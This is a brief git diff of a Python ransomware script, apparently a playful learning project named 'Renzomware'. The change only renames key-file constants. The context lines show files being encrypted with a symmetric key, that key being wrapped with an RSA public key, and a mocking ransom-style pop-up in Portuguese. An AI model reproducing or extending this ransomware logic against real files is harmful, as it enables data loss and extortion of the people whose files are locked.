@@ -3,7 +3,7 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
-from common import list_files, show_pop_up, PUBLIC_ASYM_KEY_FILE_NAME, SYM_KEY_FILE_NAME
+from common import list_files, show_pop_up, PUBLIC_ASYM_KEY_FILENAME, SYM_KEY_FILENAME
 
 import os
 
@@ -58,9 +58,9 @@ def main():
     for filename in filenames_list:
         encrypt_file(filename,  sym_key)
 
-    public_key = read_public_key(PUBLIC_ASYM_KEY_FILE_NAME)
+    public_key = read_public_key(PUBLIC_ASYM_KEY_FILENAME)
 
-    encrypt_sym_key(sym_key, public_key, SYM_KEY_FILE_NAME)
+    encrypt_sym_key(sym_key, public_key, SYM_KEY_FILENAME)
 
     show_pop_up("Toma um Renzomware!!", "Seus arquivos de gatinhos agora estão encriptados, muahaha!!")
 
